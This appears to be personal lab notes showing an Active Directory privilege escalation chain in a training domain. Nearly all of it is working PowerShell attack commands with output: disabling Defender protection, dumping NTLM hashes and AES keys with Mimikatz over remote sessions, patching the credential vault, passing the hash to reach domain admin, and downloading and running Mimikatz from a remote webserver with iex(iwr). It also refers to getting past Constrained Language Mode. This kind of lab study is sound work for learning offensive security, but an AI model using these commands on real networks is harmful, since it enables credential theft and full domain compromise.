# Privilege escalation by Derivative Local Admin (Getting pass Constrained Language Mode)


1. Find out which Machine has local admin
```powershell
# PowerView
Find-LocalAdminAccess

# or Find-PSRemotingLocalAdminAccess.ps1

```

2. RSRemote to host and run Invoke-mimikatz
```powershell

# create remote session
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

# disable windows defender
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

# run invoke mimikatz
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

#..
# User Name : srvadmin
# ..
# NTLM : a98e18228819e8eec3dfa33cb68b0728
```

If encounter ConstrainedLanguageMode where we cannot run scripts or do dot sourcing to run them, refer to [[Powershell - Constrained Language Mode (CLM) How To overcome]]

3. Using new found NTLM hash, check if compromised user has local admin privilege on other machine where a domain admin session is available

```powershell
# got domain admin ntlm hash

Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'


# with new powershell session run powerview
Invoke-UserHunter -CheckAccess | select Username,ComputerName,LocalAdmin

#UserName      ComputerName                            LocalAdmin
#--------      ------------                            ----------
#svcadmin      dcorp-mgmt.dollarcorp.moneycorp.local         True
#Administrator dcorp-appsrv.dollarcorp.moneycorp.local      False

```

We can see that `svcadmin` who is the Domain Admin has an active session in `dcorp-mgmt`

4.  Remote to machine and dump Domain Admin hashes
```powershell
Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

# run bypass AMSI

# load mimikatz, serve the file remotely by webserver
iex (iwr http://172.16.100.133/Invoke-Mimikatz.ps1 -UseBasicParsing)

# Dump hashes
Invoke-Mimikatz

# * Username : svcadmin
# * Domain   : dcorp
# * NTLM     : b38ff50264b74508085d82c69794a4d8
# * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
# * DPAPI    : fd3c6842994af6bd69814effeedc55d3


# We can also get AES keys
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# * Key List :
#   aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011


# Get credentials from credentials vault
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

5. Run powershell as Domain Admin privileges using the pass-the-hash with Domain Admin NTLM

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'

# check 
Enter-PSSession -ComputerName dcorp-dc
hostname
```